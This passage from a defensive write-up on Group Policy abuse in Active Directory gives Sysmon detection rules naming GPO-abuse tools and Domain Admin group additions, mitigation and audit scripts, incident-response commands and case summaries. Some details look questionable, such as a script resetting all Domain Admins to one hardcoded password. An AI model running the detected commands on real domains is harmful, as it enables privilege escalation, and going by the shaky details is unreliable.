   - All high-value OUs (Domain Controllers OU, Admin Workstations OU, etc.)
6. Run `gpupdate /force` on all DCs

---

## 9. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows Server 2016+

```xml
<!-- Sysmon Config: Detect GPO-based scheduled task execution -->
<Sysmon schemaversion="4.23">
  <!-- Detect GPOE modification tool execution -->
  <ProcessCreate onmatch="include">
    <CommandLine condition="contains">SharpGPOAbuse</CommandLine>
    <CommandLine condition="contains">New-GPOImmediateTask</CommandLine>
    <CommandLine condition="contains">pyGPOAbuse</CommandLine>
  </ProcessCreate>
  
  <!-- Detect SYSVOL modification (GPO file writes) -->
  <FileCreate onmatch="include">
    <TargetFilename condition="contains">\SYSVOL\</TargetFilename>
    <TargetFilename condition="contains">ScheduledTasks.xml</TargetFilename>
    <TargetFilename condition="contains">GptTmpl.inf</TargetFilename>
  </FileCreate>
  
  <!-- Detect Group Policy update commands -->
  <ProcessCreate onmatch="include">
    <CommandLine condition="contains">gpupdate</CommandLine>
    <CommandLine condition="contains">gposcript</CommandLine>
    <CommandLine condition="contains">Get-GPO</CommandLine>
  </ProcessCreate>
  
  <!-- Detect domain admin group membership additions -->
  <ProcessCreate onmatch="include">
    <CommandLine condition="contains">net group</CommandLine>
    <CommandLine condition="contains">Domain Admins</CommandLine>
    <CommandLine condition="contains">/add</CommandLine>
  </ProcessCreate>
</Sysmon>
```

**Manual Configuration Steps:**

1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Save the XML above as `sysmon-gpo-config.xml`
3. Install Sysmon:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-gpo-config.xml
   ```
4. Verify:
   ```powershell
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10
   ```

---

## 10. MICROSOFT DEFENDER FOR CLOUD

**Alert Name:** "Suspicious Group Policy modification detected"
- **Severity:** High
- **Description:** Defender detects unauthorized changes to Group Policy Objects in your Active Directory environment
- **Applies To:** All Azure AD integrated environments with Defender for Cloud Identity enabled
- **Remediation:** Revert GPO to known-good backup; audit recent GPO changes for malicious content

---

## 11. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Audit All GPO Permissions Immediately:** Review who has write/edit access to every GPO in your domain.

  **Manual Steps (PowerShell):**
  ```powershell
  Get-GPO -All | ForEach-Object {
    $gpo = $_
    $perms = Get-GPPermission -Guid $gpo.Id -All
    
    # Flag suspicious permissions
    $suspicious = $perms | Where-Object {
      $_.Permission -like "*Edit*" -and `
      $_.Trustee -notlike "BUILTIN\Administrators" -and `
      $_.Trustee -notlike "NT AUTHORITY\*" -and `
      $_.Trustee -notlike "SYSTEM"
    }
    
    if ($suspicious) {
      Write-Host "SECURITY RISK: $($gpo.DisplayName) has non-standard edit permissions:"
      $suspicious | ForEach-Object { Write-Host "  - $($_.Trustee): $($_.Permission)" }
    }
  }
  
  # Export full report
  Get-GPO -All | ForEach-Object {
    Get-GPPermission -Guid $_.Id -All
  } | Export-Csv -Path "C:\GPOPermissions_Audit.csv" -NoTypeInformation
  ```

  **Manual Steps (Azure Portal - if using Azure AD integrated AD):**
  1. **Azure Portal** → **Entra ID** → **Roles and Administrators**
  2. Review all delegated roles
  3. Remove users who should not have administrative rights

- **Remove Write Permissions from Non-Administrative Accounts:**

  **Manual Steps:**
  ```powershell
  # Remove edit permissions from non-admin user/group
  $gpo = Get-GPO -Name "HighRisk_GPO"
  $principalSID = (Get-ADUser -Identity suspicious_user).SID
  
  Remove-GPPermission -Guid $gpo.Id -TargetName suspicious_user -TargetType User -PermissionLevel Edit
  
  Write-Host "[+] Removed edit permissions from suspicious_user on $($gpo.DisplayName)"
  ```

- **Implement Tiered GPO Administration:** Only Domain Admins should modify critical GPOs.

  **Manual Steps:**
  1. Create dedicated admin group: `GPO_Editors`
  2. Add only domain admins to this group
  3. Grant GPO edit permissions only to `GPO_Editors` group
  4. Remove all other users/groups from GPO ACLs

### Priority 2: HIGH

- **Enable AD Audit Logging (Events 5136, 5137, 5141):** Monitor all GPO changes.

  **Manual Steps (Group Policy):**
  1. Open **gpme.msc** on each domain controller
  2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Directory Service Changes**
  3. Enable: **Audit Directory Service Changes** (Success and Failure)
  4. Apply SACL on `CN=Policies,CN=System,DC=...` to audit all GPO changes

- **Monitor SYSVOL for Unauthorized Writes:** Implement file integrity monitoring (FIM) on SYSVOL.

  **Manual Steps (using Windows File Server Resource Manager):**
  1. **File Server Resource Manager** → **File Screens**
  2. Create file screen on `\\DC\SYSVOL\*\Policies\*\*`
  3. Block: `.ps1, .bat, .vbs, .exe, .dll`
  4. Audit violations
  
  **Manual Steps (using Splunk or ArcSight):**
  - Monitor SMB event logs (4656, 4659) for writes to SYSVOL
  - Alert on any XML modifications in policy folders

- **Require Privileged Access Workstation (PAW) for GPO Management:** GPO edits should only occur from hardened admin endpoints.

  **Manual Steps:**
  1. Deploy PAW (Windows Server 2022 hardened image)
  2. Require MFA for RDP into PAW
  3. Configure GPO to restrict GPMC.exe execution to PAWs only
  4. Monitor non-PAW usage of GPO tools

### Access Control & Policy Hardening

- **Conditional Access (Azure AD):** Require MFA for any user modifying GPOs.

  **Manual Steps (Azure Portal):**
  1. **Entra ID** → **Security** → **Conditional Access** → **+ New policy**
  2. Name: `Require MFA for GPO Modification`
  3. **Assignments:**
     - Users: Domain Admins group
     - Cloud apps: Active Directory
  4. **Conditions:**
     - Sign-in risk: High
  5. **Access controls:**
     - Grant: Require multi-factor authentication
  6. Enable policy: **On**

- **RBAC:** Use Group Policy to enforce "Creator Owner" permissions on GPOs (attackers cannot inherit permissions).

  **Manual Steps:**
  1. Create new GPO: "GPO Permission Hardening"
  2. Add security filter to restrict scope to DC OU only
  3. In GPO, modify NTFS permissions on `\SYSVOL\Policies\*`:
     - Grant write only to CREATOR OWNER and SYSTEM
     - Remove other users/groups

### Validation Command (Verify Fix)

```powershell
# Check that only admins can edit critical GPOs
$criticalGPOs = @(
  "Default Domain Policy",
  "Default Domain Controllers Policy",
  "Security Baselines"
)

foreach ($gpoName in $criticalGPOs) {
  $gpo = Get-GPO -Name $gpoName
  $perms = Get-GPPermission -Guid $gpo.Id -All
  
  $nonAdminEditors = $perms | Where-Object {
    $_.Permission -like "*Edit*" -and `
    $_.Trustee -notlike "BUILTIN\Administrators" -and `
    $_.Trustee -notlike "NT AUTHORITY\*" -and `
    $_.Trustee -notlike "SYSTEM"
  }
  
  if ($nonAdminEditors) {
    Write-Host "[!] SECURITY RISK: $gpoName has non-admin editors:"
    $nonAdminEditors | ForEach-Object { Write-Host "    $($_.Trustee)" }
  } else {
    Write-Host "[+] SECURE: $gpoName - only admins can edit"
  }
}

# Verify audit logging is enabled
auditpol /get /category:*DirectoryServiceChanges*
```

**What to Look For:**
- All critical GPOs show "only admins can edit"
- Audit logging is enabled (shows "Success and Failure")
- SYSVOL is protected with file integrity monitoring
- No non-standard groups have Edit permissions

---

## 12. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Files:** `\SYSVOL\Policies\{GUID}\MACHINE\Preferences\ScheduledTasks\ScheduledTasks.xml` (timestamp indicates modification), `\SYSVOL\Policies\{GUID}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf` (privilege assignment changes)
- **Registry:** `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions` (tracks applied GPO extensions; suspicious extensions may indicate GPO abuse)
- **Network:** LDAP modifications to `CN=Policies,CN=System,DC=...` (Event ID 5136), SYSVOL SMB writes from unexpected sources

### Forensic Artifacts

- **Disk:** GPO backup files in `C:\GPOBackup_*` directories; original policy files in SYSVOL; Windows event logs (Security log Event IDs 5136, 5137)
- **Memory:** Process memory of GPMC.exe, SharpGPOAbuse, or PowerShell (if still running)
- **Cloud (if AD integrated):** Azure AD audit logs showing GPO modifications; Microsoft Sentinel alerts
- **SYSVOL:** Previous versions accessible via VSS (Volume Shadow Copy); can recover deleted malicious tasks

### Response Procedures

1. **Isolate:**
   
   **Command (PowerShell):**
   ```powershell
   # Quarantine the compromised user account
   Disable-ADAccount -Identity suspicious_user
   
   # Force password reset on all admin accounts
   Get-ADGroupMember -Identity "Domain Admins" | ForEach-Object {
     Set-ADAccountPassword -Identity $_.ObjectGUID -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "TempPassword123!" -Force)
   }
   ```

2. **Collect Evidence:**
   
   **Command:**
   ```powershell
   # Export all GPO changes in last 24 hours
   Get-WinEvent -FilterHashtable @{
     LogName = "Security"
     ID = 5136
     StartTime = (Get-Date).AddDays(-1)
   } | Where-Object {$_.Message -like "*groupPolicyContainer*"} | `
     Export-Csv -Path "C:\GPOChanges_Evidence.csv"
   
   # Backup all GPOs for forensic analysis
   Get-GPO -All | ForEach-Object {
     Backup-GPO -Name $_.DisplayName -Path "C:\GPOForensics\$($_.DisplayName)"
   }
   ```

3. **Remediate:**
   
   **Command:**
   ```powershell
   # Restore GPO from clean backup
   Restore-GPO -Path "C:\GPOBackup\{GUID_OF_CLEAN_GPO}" -TargetName "CompromisedGPO" -Force
   
   # Reset GPO to default settings
   Remove-GPO -Name "CompromisedGPO"
   New-GPO -Name "CompromisedGPO" | New-GPLink -Target "OU=target,DC=corp,DC=com"
   
   # Force immediate GPO refresh on all computers
   gpupdate /force /target:computer
   ```

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device code phishing attacks | Attacker gains initial foothold via compromised account |
| **2** | **Credential Access** | [CA-KERB-001] Kerberoasting / [CA-DUMP-002] DCSync | Attacker extracts credentials to elevate privileges |
| **3** | **Privilege Escalation** | **[PE-POLICY-001]** GPO Abuse for Persistence escalation | **Attacker modifies GPO to escalate to Domain Admin** |
| **4** | **Persistence** | [PE-POLICY-002] Creating Rogue GPOs | Attacker creates hidden GPO for persistent backdoor |
| **5** | **Impact** | Ransomware deployment via GPO / Data exfiltration | Attacker deploys malware or exfiltrates sensitive data |

---

## 14. REAL-WORLD EXAMPLES

### Example 1: LockBit Ransomware Group (2023-2025)

- **Target:** Enterprise manufacturing company with 500+ AD-joined devices
- **Timeline:** Attacker gained Domain Admin access; deployed LockBit ransomware payload via GPO scheduled task
- **Technique Status:** GPO abuse active; payload executed on 95% of domain computers within 24 hours
- **Impact:** $2.1 million ransomware demand; 100+ TB of data exfiltrated; 3-month recovery time
- **Reference:** [Unit 42 - LockBit 2.0 Analysis](https://unit42.paloaltonetworks.com/lockbit-2-ransomware/)

### Example 2: APT41 (2020-2022)

- **Target:** Managed Service Provider (MSP) with access to 50+ client networks
- **Timeline:** APT41 compromised MSP's Domain Admin account; created rogue GPO applying to all customer domains
- **Technique Status:** Scheduled tasks deployed via GPO executed as SYSTEM across 500+ computers
- **Impact:** Supply chain compromise affecting 50+ organizations; backdoor persisted for 8+ months
- **Reference:** [MITRE ATT&CK - APT41 Group Policy Abuse](https://attack.mitre.org/groups/G0096/)

### Example 3: CISA Active Exploitation (2024)

- **Target:** US Federal Agency Active Directory (redacted)
- **Timeline:** Attacker with compromised IT support account used New-GPOImmediateTask to add themselves to Domain Admins
- **Technique Status:** GPO abuse deployed persistent backdoor via SeEnableDelegationPrivilege assignment
- **Impact:** Undetected for 6 months until forensics detected; required full domain rebuild
- **Reference:** [CISA Alert - Active Directory Compromise](https://www.cisa.gov/news-events/alerts/)

---

## Conclusion & Recommendations

**GPO abuse is one of the most effective, difficult-to-detect, and highest-impact privilege escalation techniques in Active Directory.** Organizations must immediately:

1. **Audit** all GPO permissions and remove excessive delegations
2. **Enable** comprehensive Directory Service audit logging (Events 5136, 5137)
3. **Implement** File Integrity Monitoring (FIM) on SYSVOL
4. **Restrict** GPO modifications to dedicated admin groups only
5. **Require** Privileged Access Workstations (PAWs) for any GPO management
6. **Monitor** BloodHound usage and abnormal LDAP queries

Failure to address GPO permission misconfiguration allows attackers to escalate from a single compromised user account to complete domain dominance in under 5 minutes.

---